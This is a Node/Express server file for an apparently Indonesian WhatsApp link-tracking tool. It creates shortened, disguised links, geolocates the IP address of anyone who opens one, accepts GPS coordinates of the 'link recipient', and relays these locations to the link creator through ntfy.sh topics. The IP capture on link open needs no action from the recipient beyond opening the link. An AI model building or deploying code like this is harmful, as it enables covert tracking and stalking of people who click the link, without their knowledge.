import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import { createServer as createViteServer } from 'vite';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

export interface StoredSharedLocation {
  id: string;
  createdAt: string;
  senderLabel: string;
  linkToken?: string;
  latitude: number;
  longitude: number;
  accuracyMeters: number | null;
  locationLabel: string;
  note: string;
}

const sharedLocationsStore: StoredSharedLocation[] = [];
const relayEventsByToken: Record<string, any[]> = {};

async function lookupIpGeoServerSide(ip: string) {
  if (
    !ip ||
    ip === '127.0.0.1' ||
    ip === '::1' ||
    ip.startsWith('192.168.') ||
    ip.startsWith('10.')
  ) {
    return null;
  }
  const cleanIp = ip.split(',')[0].trim();
  try {
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), 2500);
    const res = await fetch(`https://ipwho.is/${encodeURIComponent(cleanIp)}`, {
      signal: controller.signal,
    });
    clearTimeout(t);
    if (res.ok) {
      const data = await res.json();
      if (
        data &&
        data.success !== false &&
        typeof data.latitude === 'number' &&
        typeof data.longitude === 'number'
      ) {
        const parts = [data.city, data.region, data.country].filter(Boolean);
        return {
          lat: Number(data.latitude.toFixed(6)),
          lng: Number(data.longitude.toFixed(6)),
          acc: 120,
          address:
            parts.join(', ') || `${data.latitude.toFixed(6)}, ${data.longitude.toFixed(6)}`,
        };
      }
    }
  } catch {
    // Ignore
  }
  return null;
}

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // Shorten URL dynamically via clean HTTP 302 shorteners (no .ru servers)
  app.get('/api/shorten', async (req, res) => {
    const targetUrl = typeof req.query.url === 'string' ? req.query.url.trim() : '';
    if (!targetUrl) {
      return res.status(400).json({ error: 'Missing url parameter' });
    }

    const endpoints = [
      `https://da.gd/s?url=${encodeURIComponent(targetUrl)}`,
      `https://tinyurl.com/api-create.php?url=${encodeURIComponent(targetUrl)}`,
    ];

    for (const ep of endpoints) {
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 3500);
        const response = await fetch(ep, { signal: controller.signal });
        clearTimeout(timer);
        if (response.ok) {
          const text = (await response.text()).trim();
          if (text.startsWith('http://') || text.startsWith('https://')) {
            return res.json({ shortUrl: text });
          }
        }
      } catch {
        // Try next provider
      }
    }

    return res.json({ shortUrl: targetUrl });
  });

  // Resolve redirected URLs (e.g. maps.app.goo.gl, goo.gl/maps, bit.ly)
  app.get('/api/resolve-url', async (req, res) => {
    const inputUrl = typeof req.query.url === 'string' ? req.query.url.trim() : '';
    if (!inputUrl) {
      return res.status(400).json({ error: 'Missing url parameter' });
    }

    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 4500);
      const response = await fetch(inputUrl, {
        method: 'GET',
        redirect: 'follow',
        signal: controller.signal,
        headers: {
          'User-Agent':
            'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        },
      });
      clearTimeout(timer);
      return res.json({ finalUrl: response.url || inputUrl });
    } catch {
      return res.json({ finalUrl: inputUrl });
    }
  });

  // Unified cross-device relay endpoint (POST & GET /api/relay)
  app.post('/api/relay', async (req, res) => {
    const body = req.body || {};
    const token = typeof body.token === 'string' ? body.token.trim() : '';
    if (!token) {
      return res.status(400).json({ error: 'Missing token' });
    }

    const ntfyTopic = `geowa_v4_${encodeURIComponent(token)}`;
    const eventsToPublish = [body];

    if (body.type === 'LINK_OPENED') {
      const forwarded =
        (req.headers['x-forwarded-for'] as string) || req.socket?.remoteAddress || '';
      const ipGeo = await lookupIpGeoServerSide(forwarded);
      if (ipGeo) {
        eventsToPublish.push({
          type: 'LOCATION_CAPTURED',
          token,
          id: `loc-${token}`,
          createdAt: new Date().toLocaleTimeString('id-ID', {
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
          }),
          senderLabel: `Penerima Link #${token}`,
          latitude: ipGeo.lat,
          longitude: ipGeo.lng,
          accuracyMeters: ipGeo.acc,
          locationLabel: ipGeo.address,
          detectionMethod: `Link WA Dibuka #${token}`,
          note: `Link #${token} dibuka oleh penerima`,
          isInitialIp: true,
        });
      }
    }

    if (!relayEventsByToken[token]) {
      relayEventsByToken[token] = [];
    }

    for (const ev of eventsToPublish) {
      relayEventsByToken[token].push(ev);

      if (
        ev.type === 'LOCATION_CAPTURED' &&
        typeof ev.latitude === 'number' &&
        typeof ev.longitude === 'number'
      ) {
        const itemId = ev.id || `loc-${token}`;
        const newItem: StoredSharedLocation = {
          id: itemId,
          createdAt:
            ev.createdAt ||
            new Date().toLocaleTimeString('id-ID', {
              hour: '2-digit',
              minute: '2-digit',
              second: '2-digit',
            }),
          senderLabel: ev.senderLabel || `Penerima Link #${token}`,
          linkToken: token,
          latitude: Number(ev.latitude.toFixed(6)),
          longitude: Number(ev.longitude.toFixed(6)),
          accuracyMeters: typeof ev.accuracyMeters === 'number' ? ev.accuracyMeters : 15,
          locationLabel:
            ev.locationLabel || `${ev.latitude.toFixed(6)}, ${ev.longitude.toFixed(6)}`,
          note: ev.note || `Link #${token} dibuka oleh penerima`,
        };
        const existingIdx = sharedLocationsStore.findIndex((x) => x.id === itemId);
        if (existingIdx !== -1) {
          sharedLocationsStore[existingIdx] = newItem;
        } else {
          sharedLocationsStore.unshift(newItem);
        }
      }

      try {
        await fetch(`https://ntfy.sh/${ntfyTopic}`, {
          method: 'POST',
          body: JSON.stringify(ev),
        });
      } catch {
        // Ignore
      }
    }

    return res.json({ ok: true, events: eventsToPublish });
  });

  app.get('/api/relay', async (req, res) => {
    const token = typeof req.query.token === 'string' ? req.query.token.trim() : '';
    if (!token) {
      return res.json({ events: [] });
    }

    const ntfyTopic = `geowa_v4_${encodeURIComponent(token)}`;
    const collected = [...(relayEventsByToken[token] || [])];

    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 2200);
      const response = await fetch(`https://ntfy.sh/${ntfyTopic}/json?poll=1&since=45m`, {
        signal: controller.signal,
      });
      clearTimeout(timer);
      if (response.ok) {
        const text = await response.text();
        const lines = text.split('\n').filter((l) => l.trim());
        for (const line of lines) {
          try {
            const parsedLine = JSON.parse(line);
            if (parsedLine && typeof parsedLine.message === 'string') {
              const ev = JSON.parse(parsedLine.message);
              collected.push(ev);
            }
          } catch {
            // Ignore
          }
        }
      }
    } catch {
      // Ignore
    }

    return res.json({ events: collected });
  });

  // Get all shared GPS locations
  app.get('/api/shared-locations', (_req, res) => {
    res.json({ items: sharedLocationsStore });
  });

  // Save or update a GPS location
  app.post('/api/shared-locations', (req, res) => {
    const { id, senderLabel, linkToken, latitude, longitude, accuracyMeters, locationLabel, note } =
      req.body || {};
    const lat = Number(latitude);
    const lng = Number(longitude);

    if (Number.isNaN(lat) || Number.isNaN(lng) || lat < -90 || lat > 90 || lng < -180 || lng > 180) {
      return res.status(400).json({ error: 'Koordinat tidak valid' });
    }

    const cleanToken =
      typeof linkToken === 'string' && linkToken.trim() ? linkToken.trim() : undefined;

    const itemId =
      typeof id === 'string' && id.trim()
        ? id.trim()
        : cleanToken
        ? `loc-${cleanToken}`
        : `gps-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;

    const newItem: StoredSharedLocation = {
      id: itemId,
      createdAt: new Date().toLocaleTimeString('id-ID', {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
      }),
      senderLabel:
        typeof senderLabel === 'string' && senderLabel.trim()
          ? senderLabel.trim()
          : cleanToken
          ? `Penerima Link #${cleanToken}`
          : 'Penerima Link WhatsApp',
      linkToken: cleanToken,
      latitude: Number(lat.toFixed(6)),
      longitude: Number(lng.toFixed(6)),
      accuracyMeters: typeof accuracyMeters === 'number' ? Math.round(accuracyMeters) : null,
      locationLabel:
        typeof locationLabel === 'string' && locationLabel.trim()
          ? locationLabel.trim()
          : `${lat.toFixed(6)}, ${lng.toFixed(6)}`,
      note:
        typeof note === 'string' && note.trim()
          ? note.trim()
          : 'Koordinat lokasi saat tautan dibuka oleh penerima',
    };

    const existingIdx = sharedLocationsStore.findIndex((item) => item.id === itemId);
    if (existingIdx !== -1) {
      sharedLocationsStore[existingIdx] = newItem;
    } else {
      sharedLocationsStore.unshift(newItem);
    }

    return res.status(201).json({ item: newItem });
  });

  // Delete a specific shared location by ID
  app.delete('/api/shared-locations/:id', (req, res) => {
    const { id } = req.params;
    const idx = sharedLocationsStore.findIndex((item) => item.id === id);
    if (idx !== -1) {
      sharedLocationsStore.splice(idx, 1);
    }
    return res.json({ ok: true });
  });

  // Delete all shared locations or a specific one via ?id=...
  app.delete('/api/shared-locations', (req, res) => {
    const idQuery = typeof req.query.id === 'string' ? req.query.id : '';
    if (idQuery) {
      const idx = sharedLocationsStore.findIndex((item) => item.id === idQuery);
      if (idx !== -1) {
        sharedLocationsStore.splice(idx, 1);
      }
      return res.json({ ok: true });
    }
    sharedLocationsStore.length = 0;
    return res.json({ ok: true });
  });

  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(__dirname, 'dist');
    app.use(express.static(distPath));
    app.get('*', (_req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
